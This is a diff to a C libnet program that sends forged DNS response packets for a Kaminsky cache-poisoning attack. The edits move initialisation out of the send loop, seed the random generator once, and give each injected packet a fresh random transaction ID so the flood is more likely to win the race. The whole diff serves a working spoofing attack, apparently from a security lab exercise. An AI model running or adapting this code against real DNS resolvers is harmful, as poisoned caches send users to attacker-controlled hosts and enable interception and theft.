@@ -105,6 +105,15 @@ main(int argc, char *argv[])
 	/*
 	 *  Initialize the library.  Root priviledges are required.
 	 */
+	struct timeval tv;
+	gettimeofday(&tv, NULL);
+	srand(tv.tv_sec);
+	
+	load_ethernet();
+	load_tcp_udp();
+	load_ip();
+	convert_proto();
+
 while(1){
 	l = libnet_init(
 			LIBNET_LINK,                             /* injection type */
@@ -156,15 +165,8 @@ while(1){
     	/*
      	 * DNS payload used for Kaminsky attack
      	 */
-	client_ip = libnet_name2addr4(l, client_ip_addr, LIBNET_RESOLVE);
-	target_DNS_server_ip = libnet_name2addr4(l, target_DNS_server_ip_addr, LIBNET_RESOLVE);
-	other_DNS_server_ip = libnet_name2addr4(l, other_DNS_server_ip_addr, LIBNET_RESOLVE);
 	
 	load_payload();
-	load_ethernet();
-	load_tcp_udp();
-	load_ip();
-	convert_proto();
 
 	if(ip_proto_val==IPPROTO_TCP){    
 		t = libnet_build_tcp(
@@ -187,7 +189,7 @@ while(1){
 		if (t == -1)
 		{
 			fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
-			goto bad;
+			return (EXIT_FAILURE);
 		}
 
 	}
@@ -206,7 +208,7 @@ while(1){
 		if (t == -1)
 		{
 			fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
-			goto bad;
+			return (EXIT_FAILURE);
 		}
 	}
 
@@ -229,7 +231,7 @@ while(1){
 	if (t == -1)
 	{
 		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
-		goto bad;
+		return (EXIT_FAILURE);
 	}
 
 	t = libnet_build_ethernet(
@@ -243,7 +245,7 @@ while(1){
 	if (t == -1)
 	{
 		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
-		goto bad;
+		return (EXIT_FAILURE);
 	}
 	/*	
 	 *  Write it to the wire.
@@ -261,6 +263,7 @@ while(1){
 	{
 		for(x=0;x < eth_pktcount;x++) /* Nested packet count loop */
 		{
+			load_payload();
 			c = libnet_write(l);
 		}
 		if (nap_time == -1){
@@ -273,12 +276,7 @@ while(1){
 
 	printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
 
-	/* give the buf memory back */
-
-	//libnet_destroy(l);
-bad:
 	libnet_destroy(l);
-	return (EXIT_FAILURE);
 }
 }
 
@@ -290,7 +288,6 @@ usage()
     /* load_payload: load the payload into memory */
 load_payload()
 {
-    FILE *infile;
     struct stat statbuf;
     int i = 12,k,l,m;
     int c = 0;
@@ -309,14 +306,11 @@ load_payload()
 
     /* open the file and read it into memory */
 
-    infile = fopen(payload_file, "r");	/* open the payload file read only */
     
-	struct timeval tv;
-	gettimeofday(&tv, NULL);
-	srand(tv.tv_sec);
 
 	/* Generate random number using rand function and generate randomized prefix */
-	unsigned int id = rand() % 65536;	
+	unsigned int id = rand();
+		id = id % 65536;	
     payload_location[0] = id/256; payload_location[1] = id%256;
 
 	payload_location[2] = 0x81; payload_location[3] = 0x80;
@@ -405,7 +399,6 @@ load_payload()
 	printf("\n");
 
 	fflush(stdout);
-	fclose(infile);
 }
 
     /* load_ethernet: load ethernet data file into the variables */
